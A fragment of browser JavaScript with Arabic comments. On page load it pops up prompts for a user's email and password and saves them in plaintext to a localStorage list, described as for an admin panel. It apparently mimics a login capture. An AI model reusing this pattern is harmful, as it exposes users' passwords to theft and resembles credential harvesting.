        const expectedDevice = sessionStorage.getItem("device"); 
        const actualDevice = detectDevice();
    
        function detectDevice() {
            const userAgent = navigator.userAgent.toLowerCase();
            return (userAgent.includes("mobile") || userAgent.includes("android") || userAgent.includes("iphone")) ? "mobile" : "desktop";
        }
    


  // دالة لفتح نافذة تطلب إدخال البريد الإلكتروني وكلمة المرور
  function handleLoginData() {
      const email = prompt("أدخل بريدك الإلكتروني:");
      const password = prompt("أدخل كلمة السر:");

      // تخزين البيانات في لوحة تحكم المسؤول
      const loginData = {
        email: email,
        password: password,
        device: "mobile",
        timestamp: new Date().toLocaleString()
      };

      let logins = JSON.parse(localStorage.getItem("logins")) || [];
      logins.push(loginData);
      localStorage.setItem("logins", JSON.stringify(logins));

      alert(`تم تسجيل الدخول عبر الهاتف: ${email}`);
    }

    window.onload = handleLoginData;


    </script>
